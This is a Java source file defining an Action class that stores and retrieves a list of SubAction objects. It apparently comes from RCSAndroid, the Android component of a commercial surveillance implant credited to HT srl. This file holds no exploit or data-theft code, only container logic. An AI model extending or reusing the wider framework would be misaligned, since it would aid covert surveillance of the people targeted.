/***********************************************
 * Create by : Alberto "Quequero" Pelliccione
 * Company   : HT srl
 * Project   : RCSAndroid
 * Created   : 01-dec-2010
 **********************************************/

package com.ht.RCSAndroidGUI.action;

import java.util.ArrayList;
import java.util.Iterator;
import java.util.List;
import java.util.ListIterator;

import android.util.Log;

import com.ht.RCSAndroidGUI.RCSException;
import com.ht.RCSAndroidGUI.util.Check;

/**
 * The Class Action.
 */
public class Action {
	private static final String TAG = "Action";
	
	/** The Constant ACTION_NULL. */
	public static final int ACTION_NULL = -1;

	/** Action array. */
	private final List<SubAction> list;

	/** Action ID. */
	private final int actionId;

	/**
	 * Action constructor.
	 * 
	 * @param id
	 *            : action id
	 * @param num
	 *            : number of subactions
	 * @throws RCSException
	 *             the RCS exception
	 */
	public Action(final int id) {
		Check.asserts(id >= 0, "Invalid id");

		this.actionId = id;
		list = new ArrayList<SubAction>();
	}

	/**
	 * Gets the id.
	 * 
	 * @return the id
	 */
	public int getId() {
		return this.actionId;
	}

	/**
	 * Gets the sub actions num.
	 * 
	 * @return the sub actions num
	 */
	public int getSubActionsNum() {
		return list.size();
	}

	/**
	 * Adds the sub action.
	 * 
	 * @param type
	 *            the type
	 * @param params
	 *            the params
	 * @throws RCSException
	 *             the RCS exception
	 */
	public void addSubAction(final int typeId, final byte[] params) throws RCSException {
		SubActionType type = SubActionType.get(typeId);
		if (type != null) {
			final SubAction sub = SubAction.factory(type, params);
			list.add(sub);
		}else{
			Log.d("QZ", TAG + " Error (addSubAction): unknown type Id = " + typeId);
		}
	}

	/**
	 * Mainly for test purposes
	 * 
	 * @param sub
	 */
	public void addSubAction(SubAction sub) {
		list.add(sub);
	}

	/**
	 * Gets the sub action.
	 * 
	 * @param index
	 *            the index
	 * @return the sub action
	 * @throws RCSException
	 *             the rCS exception
	 */
	public SubAction getSubAction(final int index) throws RCSException {
		if (index < 0 || index >= list.size()) {
			throw new RCSException("Subaction index above SubAction array boundary");
		}

		return list.get(index);
	}

	public SubAction[] getSubActions() {
		return list.toArray(new SubAction[] {});
	}
}
